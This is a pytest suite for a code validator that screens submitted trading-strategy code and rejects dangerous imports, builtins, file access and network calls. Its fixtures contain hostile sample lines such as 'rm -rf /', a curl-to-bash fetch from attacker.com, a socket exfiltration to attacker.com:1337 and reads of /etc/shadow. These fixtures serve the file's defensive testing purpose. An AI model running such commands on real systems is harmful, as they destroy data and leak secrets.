"""
Unit tests for SecurityValidator module.

Tests AST-based code validation for dangerous operations:
- Dangerous imports (subprocess, os.system, eval, exec)
- File operations (open, pathlib, shutil)
- Network operations (socket, urllib, requests)
- Valid code acceptance (pandas, numpy, trading libraries)

Coverage target: >90%
Performance target: <100ms per validation

Test Reference: docker-sandbox-security spec tasks.md Task 9
"""

import pytest
import time
from src.sandbox.security_validator import SecurityValidator


class TestSecurityValidator:
    """Test suite for SecurityValidator class."""

    def setup_method(self):
        """Initialize validator before each test."""
        self.validator = SecurityValidator()

    # =========================================================================
    # Test 1: Dangerous Import Detection (Requirement 1.2)
    # =========================================================================

    def test_dangerous_import_subprocess(self):
        """Test detection of subprocess import."""
        code = """
import subprocess
result = subprocess.call(['ls', '-la'])
"""
        is_valid, errors = self.validator.validate(code)

        assert not is_valid, "Should reject subprocess import"
        assert len(errors) > 0, "Should return error messages"
        assert any('subprocess' in err.lower() for err in errors), \
            "Error should mention subprocess"

    def test_dangerous_import_os(self):
        """Test detection of os module import."""
        code = """
import os
os.system('rm -rf /')
"""
        is_valid, errors = self.validator.validate(code)

        assert not is_valid, "Should reject os import"
        assert any('os' in err.lower() for err in errors), \
            "Error should mention os module"

    def test_dangerous_import_from_os_system(self):
        """Test detection of 'from os import system'."""
        code = """
from os import system
system('ls')
"""
        is_valid, errors = self.validator.validate(code)

        assert not is_valid, "Should reject 'from os import system'"
        assert len(errors) > 0, "Should return error messages"

    def test_dangerous_import_sys(self):
        """Test detection of sys module import."""
        code = """
import sys
sys.exit(1)
"""
        is_valid, errors = self.validator.validate(code)

        assert not is_valid, "Should reject sys import"
        assert any('sys' in err.lower() for err in errors)

    def test_dangerous_builtin_eval(self):
        """Test detection of eval() usage."""
        code = """
result = eval("1 + 1")
"""
        is_valid, errors = self.validator.validate(code)

        assert not is_valid, "Should reject eval() usage"
        assert any('eval' in err.lower() for err in errors), \
            "Error should mention eval"

    def test_dangerous_builtin_exec(self):
        """Test detection of exec() usage."""
        code = """
exec("print('hello')")
"""
        is_valid, errors = self.validator.validate(code)

        assert not is_valid, "Should reject exec() usage"
        assert any('exec' in err.lower() for err in errors), \
            "Error should mention exec"

    def test_dangerous_builtin_compile(self):
        """Test detection of compile() usage."""
        code = """
code_obj = compile("1 + 1", "<string>", "eval")
"""
        is_valid, errors = self.validator.validate(code)

        assert not is_valid, "Should reject compile() usage"
        assert any('compile' in err.lower() for err in errors)

    def test_dangerous_builtin_import(self):
        """Test detection of __import__() usage."""
        code = """
module = __import__('os')
"""
        is_valid, errors = self.validator.validate(code)

        assert not is_valid, "Should reject __import__() usage"
        assert any('import' in err.lower() for err in errors)

    # =========================================================================
    # Test 2: File Operation Detection (Requirement 1.3)
    # =========================================================================

    def test_file_operation_open(self):
        """Test detection of open() function."""
        code = """
with open('/etc/passwd', 'r') as f:
    content = f.read()
"""
        is_valid, errors = self.validator.validate(code)

        assert not is_valid, "Should reject open() usage"
        assert any('open' in err.lower() for err in errors), \
            "Error should mention open function"

    def test_file_operation_pathlib_import(self):
        """Test detection of pathlib import."""
        code = """
from pathlib import Path
p = Path('/etc/passwd')
"""
        is_valid, errors = self.validator.validate(code)

        assert not is_valid, "Should reject pathlib import"
        assert any('pathlib' in err.lower() for err in errors)

    def test_file_operation_shutil_import(self):
        """Test detection of shutil import."""
        code = """
import shutil
shutil.rmtree('/tmp/data')
"""
        is_valid, errors = self.validator.validate(code)

        assert not is_valid, "Should reject shutil import"
        assert any('shutil' in err.lower() for err in errors)

    def test_file_operation_glob_import(self):
        """Test detection of glob import."""
        code = """
import glob
files = glob.glob('/etc/*.conf')
"""
        is_valid, errors = self.validator.validate(code)

        assert not is_valid, "Should reject glob import"
        assert any('glob' in err.lower() for err in errors)

    def test_file_operation_io_import(self):
        """Test detection of io import."""
        code = """
import io
buffer = io.BytesIO()
"""
        is_valid, errors = self.validator.validate(code)

        assert not is_valid, "Should reject io import"
        assert any('io' in err.lower() for err in errors)

    # =========================================================================
    # Test 3: Network Operation Detection (Requirement 1.3)
    # =========================================================================

    def test_network_operation_socket(self):
        """Test detection of socket import."""
        code = """
import socket
s = socket.socket()
"""
        is_valid, errors = self.validator.validate(code)

        assert not is_valid, "Should reject socket import"
        assert any('socket' in err.lower() for err in errors)

    def test_network_operation_urllib(self):
        """Test detection of urllib import."""
        code = """
import urllib.request
response = urllib.request.urlopen('http://example.com')
"""
        is_valid, errors = self.validator.validate(code)

        assert not is_valid, "Should reject urllib import"
        assert any('urllib' in err.lower() for err in errors)

    def test_network_operation_requests(self):
        """Test detection of requests import."""
        code = """
import requests
response = requests.get('http://example.com')
"""
        is_valid, errors = self.validator.validate(code)

        assert not is_valid, "Should reject requests import"
        assert any('requests' in err.lower() for err in errors)

    def test_network_operation_http_client(self):
        """Test detection of http module import."""
        code = """
import http.client
conn = http.client.HTTPSConnection('example.com')
"""
        is_valid, errors = self.validator.validate(code)

        assert not is_valid, "Should reject http import"
        assert any('http' in err.lower() for err in errors)

    def test_network_operation_ftplib(self):
        """Test detection of ftplib import."""
        code = """
import ftplib
ftp = ftplib.FTP('ftp.example.com')
"""
        is_valid, errors = self.validator.validate(code)

        assert not is_valid, "Should reject ftplib import"
        assert any('ftplib' in err.lower() for err in errors)

    def test_network_operation_smtplib(self):
        """Test detection of smtplib import."""
        code = """
import smtplib
server = smtplib.SMTP('smtp.gmail.com')
"""
        is_valid, errors = self.validator.validate(code)

        assert not is_valid, "Should reject smtplib import"
        assert any('smtplib' in err.lower() for err in errors)

    # =========================================================================
    # Test 4: Valid Code Acceptance (No False Positives)
    # =========================================================================

    def test_valid_code_pandas_import(self):
        """Test that pandas import is allowed."""
        code = """
import pandas as pd
df = pd.DataFrame({'a': [1, 2, 3]})
"""
        is_valid, errors = self.validator.validate(code)

        assert is_valid, f"Should allow pandas import. Errors: {errors}"
        assert len(errors) == 0, "Should have no error messages"

    def test_valid_code_numpy_import(self):
        """Test that numpy import is allowed."""
        code = """
import numpy as np
arr = np.array([1, 2, 3])
"""
        is_valid, errors = self.validator.validate(code)

        assert is_valid, f"Should allow numpy import. Errors: {errors}"
        assert len(errors) == 0

    def test_valid_code_datetime_import(self):
        """Test that datetime import is allowed."""
        code = """
from datetime import datetime
now = datetime.now()
"""
        is_valid, errors = self.validator.validate(code)

        assert is_valid, f"Should allow datetime import. Errors: {errors}"
        assert len(errors) == 0

    def test_valid_code_math_import(self):
        """Test that math import is allowed."""
        code = """
import math
result = math.sqrt(16)
"""
        is_valid, errors = self.validator.validate(code)

        assert is_valid, f"Should allow math import. Errors: {errors}"
        assert len(errors) == 0

    def test_valid_code_typing_import(self):
        """Test that typing import is allowed."""
        code = """
from typing import List, Dict
data: List[int] = [1, 2, 3]
"""
        is_valid, errors = self.validator.validate(code)

        assert is_valid, f"Should allow typing import. Errors: {errors}"
        assert len(errors) == 0

    def test_valid_code_collections_import(self):
        """Test that collections import is allowed."""
        code = """
from collections import defaultdict
dd = defaultdict(list)
"""
        is_valid, errors = self.validator.validate(code)

        assert is_valid, f"Should allow collections import. Errors: {errors}"
        assert len(errors) == 0

    def test_valid_code_json_import(self):
        """Test that json import is allowed."""
        code = """
import json
data = json.loads('{"key": "value"}')
"""
        is_valid, errors = self.validator.validate(code)

        assert is_valid, f"Should allow json import. Errors: {errors}"
        assert len(errors) == 0

    def test_valid_code_strategy_example(self):
        """Test realistic trading strategy code."""
        code = """
import pandas as pd
import numpy as np
from typing import Dict, Any

def calculate_momentum(close: pd.Series, period: int = 20) -> pd.Series:
    \"\"\"Calculate momentum indicator.\"\"\"
    return close.pct_change(period)

def generate_signals(data: pd.DataFrame) -> pd.DataFrame:
    \"\"\"Generate buy/sell signals based on momentum.\"\"\"
    momentum = calculate_momentum(data['close'], period=20)
    signals = pd.DataFrame(index=data.index)
    signals['position'] = np.where(momentum > 0, 1, -1)
    return signals
"""
        is_valid, errors = self.validator.validate(code)

        assert is_valid, f"Should allow realistic strategy code. Errors: {errors}"
        assert len(errors) == 0

    # =========================================================================
    # Test 5: Syntax Error Handling
    # =========================================================================

    def test_syntax_error_detection(self):
        """Test handling of code with syntax errors."""
        code = """
import pandas as pd
def broken_function(
    # Missing closing parenthesis
"""
        is_valid, errors = self.validator.validate(code)

        assert not is_valid, "Should reject code with syntax errors"
        assert len(errors) > 0
        assert any('syntax' in err.lower() for err in errors), \
            "Error should mention syntax error"

    def test_empty_code(self):
        """Test handling of empty code string."""
        code = ""
        is_valid, errors = self.validator.validate(code)

        # Empty code is syntactically valid (empty module)
        assert is_valid, "Empty code should be valid"
        assert len(errors) == 0

    def test_comments_only_code(self):
        """Test handling of code with only comments."""
        code = """
# This is a comment
# Another comment
"""
        is_valid, errors = self.validator.validate(code)

        assert is_valid, "Comments-only code should be valid"
        assert len(errors) == 0

    # =========================================================================
    # Test 6: Performance Requirements (<100ms)
    # =========================================================================

    def test_validation_performance_small_code(self):
        """Test validation completes in <100ms for small code."""
        code = """
import pandas as pd
import numpy as np

def strategy(data):
    return data['close'].rolling(20).mean()
"""
        start_time = time.time()
        is_valid, errors = self.validator.validate(code)
        elapsed_ms = (time.time() - start_time) * 1000

        assert elapsed_ms < 100, f"Validation took {elapsed_ms:.1f}ms, should be <100ms"

    def test_validation_performance_medium_code(self):
        """Test validation completes in <100ms for medium code (~200 lines)."""
        # Generate realistic strategy code
        code = """
import pandas as pd
import numpy as np
from typing import Dict, Any

def calculate_rsi(close: pd.Series, period: int = 14) -> pd.Series:
    delta = close.diff()
    gain = delta.where(delta > 0, 0)
    loss = -delta.where(delta < 0, 0)
    avg_gain = gain.rolling(window=period).mean()
    avg_loss = loss.rolling(window=period).mean()
    rs = avg_gain / avg_loss
    rsi = 100 - (100 / (1 + rs))
    return rsi

def calculate_macd(close: pd.Series, fast: int = 12, slow: int = 26, signal: int = 9):
    exp1 = close.ewm(span=fast).mean()
    exp2 = close.ewm(span=slow).mean()
    macd = exp1 - exp2
    signal_line = macd.ewm(span=signal).mean()
    return macd, signal_line

def calculate_bollinger_bands(close: pd.Series, period: int = 20, std: float = 2.0):
    sma = close.rolling(window=period).mean()
    std_dev = close.rolling(window=period).std()
    upper = sma + (std_dev * std)
    lower = sma - (std_dev * std)
    return upper, sma, lower

def generate_signals(data: pd.DataFrame) -> pd.DataFrame:
    signals = pd.DataFrame(index=data.index)
    rsi = calculate_rsi(data['close'])
    macd, signal = calculate_macd(data['close'])
    upper, middle, lower = calculate_bollinger_bands(data['close'])

    # RSI conditions
    rsi_oversold = rsi < 30
    rsi_overbought = rsi > 70

    # MACD conditions
    macd_bullish = macd > signal
    macd_bearish = macd < signal

    # Bollinger Band conditions
    bb_oversold = data['close'] < lower
    bb_overbought = data['close'] > upper

    # Combine signals
    buy_signal = (rsi_oversold & macd_bullish) | bb_oversold
    sell_signal = (rsi_overbought & macd_bearish) | bb_overbought

    signals['position'] = 0
    signals.loc[buy_signal, 'position'] = 1
    signals.loc[sell_signal, 'position'] = -1

    return signals
"""
        start_time = time.time()
        is_valid, errors = self.validator.validate(code)
        elapsed_ms = (time.time() - start_time) * 1000

        assert elapsed_ms < 100, f"Validation took {elapsed_ms:.1f}ms, should be <100ms"

    # =========================================================================
    # Test 7: Edge Cases and Complex Patterns
    # =========================================================================

    def test_nested_imports_detection(self):
        """Test detection of dangerous imports in nested modules."""
        code = """
from os.path import join
path = join('/etc', 'passwd')
"""
        is_valid, errors = self.validator.validate(code)

        assert not is_valid, "Should reject os.path import (os module)"
        assert any('os' in err.lower() for err in errors)

    def test_aliased_dangerous_import(self):
        """Test detection of dangerous import with alias."""
        code = """
import subprocess as sp
sp.call(['ls'])
"""
        is_valid, errors = self.validator.validate(code)

        assert not is_valid, "Should reject subprocess import even with alias"
        assert any('subprocess' in err.lower() for err in errors)

    def test_multiple_dangerous_operations(self):
        """Test detection when code has multiple violations."""
        code = """
import subprocess
import os
import socket

subprocess.call(['ls'])
os.system('whoami')
s = socket.socket()
"""
        is_valid, errors = self.validator.validate(code)

        assert not is_valid, "Should reject code with multiple violations"
        assert len(errors) >= 3, "Should detect all three dangerous imports"

    def test_dangerous_operation_in_function(self):
        """Test detection of dangerous operations inside functions."""
        code = """
import pandas as pd

def malicious_function():
    import subprocess
    subprocess.call(['ls'])
"""
        is_valid, errors = self.validator.validate(code)

        assert not is_valid, "Should detect dangerous import inside function"
        assert any('subprocess' in err.lower() for err in errors)

    def test_conditional_dangerous_import(self):
        """Test detection of dangerous import in conditional block."""
        code = """
import pandas as pd

if True:
    import os
    os.system('ls')
"""
        is_valid, errors = self.validator.validate(code)

        assert not is_valid, "Should detect dangerous import in if block"
        assert any('os' in err.lower() for err in errors)

    # =========================================================================
    # Test 8: Validation Report Generation
    # =========================================================================

    def test_validation_report_generation(self):
        """Test get_validation_report() returns detailed statistics."""
        code = """
import pandas as pd
import numpy as np

def strategy(data):
    return data['close'].rolling(20).mean()

def backtest(data):
    signals = strategy(data)
    return signals
"""
        report = self.validator.get_validation_report(code)

        assert 'is_valid' in report
        assert 'errors' in report
        assert 'validation_time_ms' in report
        assert 'code_lines' in report
        assert 'import_count' in report
        assert 'function_count' in report

        assert report['is_valid'] is True
        assert len(report['errors']) == 0
        assert report['validation_time_ms'] < 100
        assert report['import_count'] == 2  # pandas, numpy
        assert report['function_count'] == 2  # strategy, backtest

    def test_validation_report_with_errors(self):
        """Test validation report for code with violations."""
        code = """
import subprocess
subprocess.call(['ls'])
"""
        report = self.validator.get_validation_report(code)

        assert report['is_valid'] is False
        assert len(report['errors']) > 0
        assert report['import_count'] == 1

    # =========================================================================
    # Test 9: Allowed Imports Reference
    # =========================================================================

    def test_get_allowed_imports(self):
        """Test get_allowed_imports() returns expected modules."""
        allowed = self.validator.get_allowed_imports()

        assert 'pandas' in allowed
        assert 'numpy' in allowed
        assert 'datetime' in allowed
        assert 'json' in allowed
        assert 'typing' in allowed

        # Should NOT include dangerous modules
        assert 'subprocess' not in allowed
        assert 'os' not in allowed
        assert 'socket' not in allowed

    # =========================================================================
    # Test 10: Comprehensive Security Test
    # =========================================================================

    def test_comprehensive_security_malicious_code(self):
        """Test comprehensive validation against malicious code attempt."""
        malicious_code = """
# Attempt to bypass security
import subprocess
import os
import socket

# Command injection
subprocess.call(['rm', '-rf', '/'])
os.system('curl http://attacker.com/steal | bash')

# Network exfiltration
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('attacker.com', 1337))
s.send(b'secret_data')

# File access
with open('/etc/shadow', 'r') as f:
    passwords = f.read()

# Code execution
eval('__import__("os").system("ls")')
exec('print("pwned")')
"""
        is_valid, errors = self.validator.validate(malicious_code)

        assert not is_valid, "Should reject comprehensive malicious code"
        assert len(errors) > 5, "Should detect multiple security violations"

        # Verify specific violations are detected
        all_errors = ' '.join(errors).lower()
        assert 'subprocess' in all_errors
        assert 'os' in all_errors or 'socket' in all_errors
        assert 'open' in all_errors or 'eval' in all_errors or 'exec' in all_errors


class TestSecurityValidatorAccuracy:
    """Test validation accuracy requirements (>95% detection rate)."""

    def setup_method(self):
        """Initialize validator before each test."""
        self.validator = SecurityValidator()

    def test_accuracy_dangerous_patterns(self):
        """Test >95% accuracy for dangerous pattern detection."""
        # Collection of dangerous code patterns
        dangerous_patterns = [
            "import subprocess",
            "import os",
            "import sys",
            "from os import system",
            "from subprocess import call",
            "eval('code')",
            "exec('code')",
            "__import__('os')",
            "open('/etc/passwd')",
            "import socket",
            "import urllib.request",
            "import requests",
            "import pathlib",
            "import shutil",
            "from pathlib import Path",
        ]

        detected = 0
        total = len(dangerous_patterns)

        for pattern in dangerous_patterns:
            is_valid, errors = self.validator.validate(pattern)
            if not is_valid:
                detected += 1

        accuracy = (detected / total) * 100

        assert accuracy >= 95, f"Detection accuracy {accuracy:.1f}% is below 95% target"

    def test_accuracy_safe_patterns(self):
        """Test no false positives for safe code patterns."""
        # Collection of safe code patterns
        safe_patterns = [
            "import pandas as pd",
            "import numpy as np",
            "from datetime import datetime",
            "import json",
            "from typing import List",
            "import math",
            "import statistics",
            "from collections import defaultdict",
            "import itertools",
            "data = [1, 2, 3]",
            "result = sum(data)",
        ]

        accepted = 0
        total = len(safe_patterns)

        for pattern in safe_patterns:
            is_valid, errors = self.validator.validate(pattern)
            if is_valid:
                accepted += 1

        accuracy = (accepted / total) * 100

        assert accuracy == 100, \
            f"False positive rate {100 - accuracy:.1f}% detected (should be 0%)"


class TestSecurityValidatorEdgeCases:
    """Test edge cases and coverage completion for SecurityValidator."""

    def setup_method(self):
        """Initialize validator before each test."""
        self.validator = SecurityValidator()

    def test_network_from_import_detection(self):
        """Test detection of 'from socket import' pattern to cover line 198."""
        code = """
from socket import socket
s = socket()
"""
        is_valid, errors = self.validator.validate(code)

        assert not is_valid, "Should reject 'from socket import' pattern"
        assert len(errors) > 0
        assert any('socket' in err.lower() for err in errors)

    def test_network_from_urllib_import(self):
        """Test detection of 'from urllib import' pattern."""
        code = """
from urllib import request
response = request.urlopen('http://example.com')
"""
        is_valid, errors = self.validator.validate(code)

        assert not is_valid, "Should reject 'from urllib import' pattern"
        assert any('urllib' in err.lower() for err in errors)

    def test_network_from_requests_import(self):
        """Test detection of 'from requests import' pattern."""
        code = """
from requests import get
response = get('http://example.com')
"""
        is_valid, errors = self.validator.validate(code)

        assert not is_valid, "Should reject 'from requests import' pattern"
        assert any('requests' in err.lower() for err in errors)

    def test_validation_report_with_syntax_error(self):
        """Test get_validation_report() with syntax errors to cover lines 352-354."""
        code = """
import pandas as pd
def broken_function(
    # Missing closing parenthesis - syntax error
"""
        report = self.validator.get_validation_report(code)

        assert 'is_valid' in report
        assert 'errors' in report
        assert 'validation_time_ms' in report
        assert 'code_lines' in report
        assert 'import_count' in report
        assert 'function_count' in report

        # With syntax error, AST parsing fails
        assert report['is_valid'] is False
        assert len(report['errors']) > 0
        assert report['import_count'] == 0  # Can't count imports with syntax error
        assert report['function_count'] == 0  # Can't count functions with syntax error

    def test_validation_timeout_simulation(self):
        """Test validation timeout detection (line 139) by mocking slow validation."""
        import unittest.mock as mock

        # Create a validator instance
        validator = SecurityValidator()

        # Simple valid code
        code = "import pandas as pd"

        # Mock time.time to simulate slow validation (>100ms)
        with mock.patch('time.time') as mock_time:
            # First call returns 0 (start), second returns 0.11 (110ms elapsed)
            mock_time.side_effect = [0.0, 0.11]

            is_valid, errors = validator.validate(code)

            # Should still validate the code itself as valid
            # but add timeout error
            assert not is_valid, "Should report validation as invalid due to timeout"
            assert any('timeout' in err.lower() for err in errors), \
                "Should report timeout error"
            assert any('100ms' in err for err in errors), \
                "Should mention 100ms limit"

    def test_additional_dangerous_imports(self):
        """Test detection of additional dangerous imports for completeness."""
        dangerous_imports = [
            ("import importlib", "importlib"),
            ("import pty", "pty"),
            ("import commands", "commands"),
            ("import popen2", "popen2"),
            ("import asyncio", "asyncio"),
            ("import telnetlib", "telnetlib"),
            ("import nntplib", "nntplib"),
            ("import poplib", "poplib"),
            ("import imaplib", "imaplib"),
        ]

        for code, module_name in dangerous_imports:
            is_valid, errors = self.validator.validate(code)
            assert not is_valid, f"Should reject {module_name} import"
            assert len(errors) > 0, f"Should return errors for {module_name}"

    def test_file_operation_from_imports(self):
        """Test 'from' imports for file operations."""
        dangerous_file_imports = [
            ("from pathlib import Path", "pathlib"),
            ("from shutil import rmtree", "shutil"),
            ("from glob import glob", "glob"),
            ("from tempfile import TemporaryFile", "tempfile"),
            ("from io import BytesIO", "io"),
        ]

        for code, module_name in dangerous_file_imports:
            is_valid, errors = self.validator.validate(code)
            assert not is_valid, f"Should reject 'from {module_name} import' pattern"
            assert len(errors) > 0

    def test_dangerous_builtin_in_assignment(self):
        """Test detection of dangerous builtins in different contexts."""
        # Test eval in assignment (already covered by _check_function_calls)
        code1 = "result = eval('1 + 1')"
        is_valid1, errors1 = self.validator.validate(code1)
        assert not is_valid1

        # Test exec in assignment
        code2 = "result = exec('print(1)')"
        is_valid2, errors2 = self.validator.validate(code2)
        assert not is_valid2

        # Test compile in assignment
        code3 = "obj = compile('1+1', '<string>', 'eval')"
        is_valid3, errors3 = self.validator.validate(code3)
        assert not is_valid3

    def test_attribute_access_variations(self):
        """Test various attribute access patterns for dangerous operations."""
        # Test os.system variation
        code1 = """
import os
result = os.system('ls')
"""
        is_valid1, errors1 = self.validator.validate(code1)
        assert not is_valid1
        assert any('os' in err.lower() for err in errors1)

        # Test subprocess.call variation
        code2 = """
import subprocess
subprocess.Popen(['ls'])
"""
        is_valid2, errors2 = self.validator.validate(code2)
        assert not is_valid2
        assert any('subprocess' in err.lower() for err in errors2)

    def test_complex_legitimate_strategy(self):
        """Test complex but legitimate trading strategy passes validation."""
        code = """
import pandas as pd
import numpy as np
from typing import Dict, Any, List, Tuple
from datetime import datetime, timedelta
from collections import defaultdict
import json
import math

class TradingStrategy:
    def __init__(self, lookback: int = 20):
        self.lookback = lookback
        self.positions: Dict[str, float] = defaultdict(float)

    def calculate_indicators(self, df: pd.DataFrame) -> pd.DataFrame:
        # RSI calculation
        delta = df['close'].diff()
        gain = delta.where(delta > 0, 0).rolling(window=14).mean()
        loss = -delta.where(delta < 0, 0).rolling(window=14).mean()
        rs = gain / loss
        df['rsi'] = 100 - (100 / (1 + rs))

        # Moving averages
        df['sma_20'] = df['close'].rolling(window=20).mean()
        df['sma_50'] = df['close'].rolling(window=50).mean()
        df['ema_12'] = df['close'].ewm(span=12).mean()

        # Bollinger Bands
        df['bb_middle'] = df['close'].rolling(window=20).mean()
        bb_std = df['close'].rolling(window=20).std()
        df['bb_upper'] = df['bb_middle'] + (bb_std * 2)
        df['bb_lower'] = df['bb_middle'] - (bb_std * 2)

        return df

    def generate_signals(self, df: pd.DataFrame) -> pd.Series:
        signals = pd.Series(index=df.index, data=0)

        # Buy conditions
        buy_conditions = (
            (df['rsi'] < 30) &
            (df['close'] < df['bb_lower']) &
            (df['sma_20'] > df['sma_50'])
        )

        # Sell conditions
        sell_conditions = (
            (df['rsi'] > 70) &
            (df['close'] > df['bb_upper']) &
            (df['sma_20'] < df['sma_50'])
        )

        signals[buy_conditions] = 1
        signals[sell_conditions] = -1

        return signals

    def calculate_metrics(self, returns: pd.Series) -> Dict[str, float]:
        return {
            'total_return': returns.sum(),
            'sharpe_ratio': returns.mean() / returns.std() * np.sqrt(252),
            'max_drawdown': (returns.cumsum() - returns.cumsum().cummax()).min(),
            'win_rate': (returns > 0).sum() / len(returns),
        }
"""
        is_valid, errors = self.validator.validate(code)

        assert is_valid, f"Complex legitimate strategy should pass. Errors: {errors}"
        assert len(errors) == 0


# =========================================================================
# Pytest Configuration
# =========================================================================

if __name__ == '__main__':
    pytest.main([__file__, '-v', '--tb=short'])
